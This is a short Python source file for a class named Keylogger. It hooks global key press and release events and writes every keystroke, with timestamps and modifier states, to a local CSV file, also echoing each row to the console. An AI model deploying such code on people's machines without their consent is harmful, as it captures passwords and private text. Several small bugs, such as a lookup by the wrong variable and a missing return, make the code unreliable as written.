import keyboard  # for keylogs
from datetime import datetime
import time


class Keylogger:
    def __init__(self):
        try:
            self.file = open(f"{'pylogs.csv'}", "w")
        except:
            exit(2)
        self.key_name_map = {
            'decimal': '.',
            '\n': 'enter'
        }
        self.down_keys = []
        self.mods = ['shift', 'ctrl', 'alt', 'windows']
        self.down_map = {'down': True, 'up': False}
        self.t_array = ['Y', 'm', 'H', 'M', 'S']

    def log(self, event):
        t = datetime.now()
        mods = ','.join(['1' if keyboard.is_pressed(mod) else '0' for mod in self.mods])
        if len(str(event).split(' ')) > 2:
            return
        key, is_down = str(event)[14:len(str(event)) - 1].split(' ')
        is_down = self.down_map[is_down]
        if key in keyboard.all_modifiers:
            return

        if self.is_old_key(key, is_down):
            return

        if key in self.key_name_map:
            key = self.key_name_map[event]
        millis = int((time.mktime(t.timetuple()) + t.microsecond / 1E6) * 1000) % 1000
        time_str = ','.join([f'{t.strftime("%" + i)}' for i in self.t_array])
        row = f'{time_str},{millis},{is_down},{mods},{key}\n'
        self.file.write(row)
        print(row)

    def start(self):
        keyboard.on_press(callback=self.log)
        keyboard.on_release(callback=self.log)
        keyboard.wait()

    def is_old_key(self, key, is_down):
        if not is_down:
            self.down_keys.remove(key)
            return False
        else:
            if key in self.down_keys:
                print('this key is down!!')
                return True
            else:
                self.down_keys.append(key)
                False
